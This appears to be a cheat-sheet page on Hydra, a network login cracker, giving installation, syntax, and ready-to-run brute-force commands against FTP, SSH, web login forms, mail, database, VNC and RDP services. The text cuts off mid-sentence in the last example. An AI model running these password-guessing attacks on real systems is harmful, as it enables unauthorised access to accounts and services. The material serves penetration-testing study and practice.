# Hydra

**Overview of Hydra:**

* Hydra is a fast and versatile network login cracker that supports various attack protocols, making it suitable for brute-forcing a wide range of services, including web applications, SSH, FTP, and databases.

**Key Features:**

* **Speed and Efficiency:** Utilizes parallel connections to perform multiple login attempts simultaneously, significantly speeding up the cracking process.
* **Flexibility:** Supports numerous protocols and services, adaptable to various attack scenarios.
* **Ease of Use:** User-friendly command-line interface with clear syntax.

**Installation:**

*   Hydra is often pre-installed on popular penetration testing distributions. To check if it's installed, run:

    ```bash
    hydra -h
    ```
*   If not installed, use the following commands to install it:

    ```bash
    sudo apt-get -y update
    sudo apt-get -y install hydra
    ```

**Basic Usage:**

*   Hydra's basic syntax is:

    ```bash
    hydra [login_options] [password_options] [attack_options] [service_options]
    ```
* **Parameters:**
  * `-l LOGIN` or `-L FILE`: Specify a single username or a file with a list of usernames.
  * `-p PASS` or `-P FILE`: Provide a single password or a file with a list of passwords.
  * `-t TASKS`: Define the number of parallel tasks (threads) to run.
  * `-f`: Fast mode; stops after the first successful login.
  * `-s PORT`: Specify a non-default port for the target service.
  * `-v` or `-V`: Verbose output for detailed progress information.
  * `service://server`: Specify the service and target server's address.
  * `/OPT`: Service-specific options for additional requirements.

**Commonly Used Services:**

| Hydra Service | Description                                    | Example Command                                                                                                |
| ------------- | ---------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| ftp           | Brute-forces FTP login credentials.            | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                             |
| ssh           | Targets SSH services for brute-forcing.        | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                              |
| http-get/post | Brute-forces HTTP web login forms.             | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| smtp          | Attacks email servers for SMTP login.          | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                          |
| pop3          | Targets POP3 login credentials.                | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                               |
| imap          | Brute-forces IMAP service credentials.         | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                               |
| mysql         | Attempts to brute-force MySQL database logins. | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`                                            |
| mssql         | Targets Microsoft SQL Server logins.           | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                              |
| vnc           | Brute-forces VNC services for remote access.   | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                      |
| rdp           | Targets Microsoft RDP services.                | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                             |

**Examples of Hydra Usage:**

1.  **Brute-Forcing HTTP Authentication:**

    ```bash
    hydra -L usernames.txt -P passwords.txt www.example.com http-get
    ```

    * Uses lists of usernames and passwords to target HTTP authentication.
2.  **Targeting Multiple SSH Servers:**

    ```bash
    hydra -l root -p toor -M targets.txt ssh
    ```

    * Tests the same credentials across multiple SSH servers listed in `targets.txt`.
3.  **Testing FTP Credentials on a Non-Standard Port:**

    ```bash
    hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
    ```

    * Tests FTP credentials on port 2121 with verbose output.
4.  **Brute-Forcing a Web Login Form:**

    {% code overflow="wrap" %}
    ```bash
    hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
    ```
    {% endcode %}

    * Targets a specific login form and checks for
